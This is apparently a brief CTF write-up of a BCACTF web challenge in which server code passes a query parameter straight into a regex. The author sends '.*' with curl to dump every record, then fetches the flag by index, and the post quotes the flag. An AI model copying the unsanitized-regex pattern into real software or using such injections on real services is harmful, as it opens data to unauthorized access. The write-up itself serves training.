---
created: 2024-06-10T02:01
updated: 2024-06-10T23:18
---

> I found this database that does not use SQL, is there any way to break it?

---

```js
if (line.match('^'+req.query.name+'$')) {
	goodLines.push(line)
}
```

So it is taking our name as regex, give it `.*` then.

```sh
curl --request GET \
  --url 'http://challs.bcactf.com:30390/?name=.*'
```

There's someone with name `Flag Holder`, that's convenient.

> Ricardo Olsen has an ID of 1

Ah, so id is the index.

```sh
curl --request GET \
  --url http://challs.bcactf.com:30390/51/Flag/Holder

# bcactf{R3gex_WH1z_54dfa9cdba13}
```

Simple stuff.
